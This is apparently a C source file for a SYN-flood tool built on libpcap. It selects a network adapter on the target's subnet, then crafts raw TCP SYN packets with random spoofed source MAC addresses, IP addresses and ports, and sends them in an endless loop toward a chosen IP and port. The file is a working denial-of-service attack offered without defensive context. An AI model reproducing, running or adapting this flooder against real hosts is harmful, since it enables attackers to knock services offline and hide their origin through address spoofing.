#define _CRT_SECURE_NO_WARNINGS
#include"ex_func.h"

int global_attack;

int get_my_addr(my_single_addr **address,char errbuf[], unsigned char *d_attack_ip)
{
	int i;

	my_addr *all_addr = NULL;
	if (get_all_addr(&all_addr, errbuf) == -1)
	{
		fprintf(stderr, "Failed to obtain the devices information\n");
		return -1;
	}

	(*address) = (my_single_addr *)malloc(sizeof(my_single_addr));

	int key=0;
	for (i = 0;i < all_addr->length;i++)
	{
		if (is_same_network(d_attack_ip, all_addr->addr[i].ip, all_addr->addr[i].mask) == 0)
		{
			key = 1;
			
			*(*address) = all_addr->addr[i];

			free(all_addr);
			all_addr = NULL;
			break;
		}
	}

	if (!key)
	{
		puts("Your computer have too many network card,you should choose one:");
		for (i = 0;i<all_addr->length; i++)
		{
			printf("%d\t:\t%s\t%s", i, all_addr->addr[i].name, all_addr->addr[i].description);
			print_net_normal(all_addr->addr[i].ip, 4);
		}

		int position;
		printf("Which one you want to choose:\t");
		scanf("%d", &position);
		*(*address) = all_addr->addr[position];

		free(all_addr);
		all_addr = NULL;
	}

	return 0;
}

int get_my_adapter(my_single_adapter **adapter, unsigned char *d_attack_ip)
{
	my_adapter *all_adapter = NULL;
	if (get_all_adapter(&all_adapter) == -1)
	{
		fprintf(stderr, "Failed to obtain the adapters information\n");
		return -1;
	}

	*adapter = (my_single_adapter *)malloc(sizeof(my_single_adapter));

	int i;
	int key = -1;
	for (i = 0;i < all_adapter->length;i++)
	{
		if (is_same_network(d_attack_ip, all_adapter->adapter[i].ip, all_adapter->adapter[i].mask) == 0)
		{
			key = 0;

			*(*adapter) = all_adapter->adapter[i];

			break;
		}
	}

	if (key == -1)
	{
		switch (all_adapter->length)
		{
		case 0:
			fprintf(stderr, "You don't have network card, please check out your device\n");
			return -1;
			break;
		case 1:
			*(*adapter) = all_adapter->adapter[0];
			break;
		default:
			puts("Your computer have too many network card,you should choose one:");
			for (i = 0;i<all_adapter->length; i++)
			{
				printf("%d\t:\t%s\t", i, all_adapter->adapter[i].description);
				print_net_normal(all_adapter->adapter[i].ip, 4);
			}

			int position;
			printf("Which one you want to choose:\t");
			scanf("%d", &position);
			*(*adapter) = all_adapter->adapter[position];
			break;
		}
	}

	free(all_adapter);
	all_adapter = NULL;
	return 0;
}

void attack(pcap_t *handle,unsigned char your_ip[], unsigned char attack_ip[], unsigned char mac[],unsigned short port)
{
	TCP_packet send = { 0 };

	int i;
	for (i = 0;i < 6;i++)
	{
		send.ether.dhost[i] = mac[i];
	}

	send.ether.r_type = reverse_short(0x0800);
	
	//for IP header
	send.ip.version_and_header_length = 0x45;
	send.ip.type_of_service = 0x00;
	*(unsigned short *)send.ip.r_length = reverse_short(0x0028);

	*(unsigned short *)send.ip.r_identification = reverse_short(0x4568);//There need reverse
	*(unsigned short *)send.ip.r_flags_offset = reverse_short(0x4000);

	send.ip.time_to_live = 64;
	send.ip.protocol = 6;

	*(int *)send.ip.source = *(int *)your_ip;
	*(int *)send.ip.destination = *(int *)attack_ip;

	//TCP
	//*(unsigned short *)send.tcp.r_source_port = reverse_short(32308);
	*(unsigned short *)send.tcp.r_destination_port =reverse_short(port);
	*(unsigned int *)send.tcp.r_sequence_number =reverse_int( 0x4510FB9);
	*(unsigned int *)send.tcp.r_acknowledge_number =reverse_int( 0x17CEC553);
	
	*(unsigned short *)send.tcp.data_offset_and_flags = reverse_short(0x5002);

	*(unsigned short *)send.tcp.r_windows = reverse_short(66);

	*(unsigned short *)send.tcp.r_urgent_pointer = reverse_short(NULL);
	srand(time(0));
	unsigned short temp;
	while (global_attack)
	{
		for (i = 0;i < 3;i++)
		{
			((unsigned short *)send.ether.shost)[i] = rand();
		}

		//send.ip.source[3] = rand()%254+1;
		*(int *)send.ip.source = rand() * 0x10000 + rand();

		*(unsigned short *)send.ip.r_header_checksum = 0x0000;
		//20 is length of my_own_ip_header
		temp = calculate_checksum((unsigned short *)&send, 0x0800);
		*(unsigned short *)send.ip.r_header_checksum = reverse_short(temp);
		*(unsigned short *)send.tcp.r_source_port = reverse_short(rand());
		*(unsigned short *)send.tcp.r_checksum = 0x0000;
		temp = calculate_checksum((unsigned short *)&send, 0x0006);
		*(unsigned short *)send.tcp.r_checksum = reverse_short(temp);
		pcap_sendpacket(handle, (unsigned char *)&send, sizeof(TCP_packet));
	}
}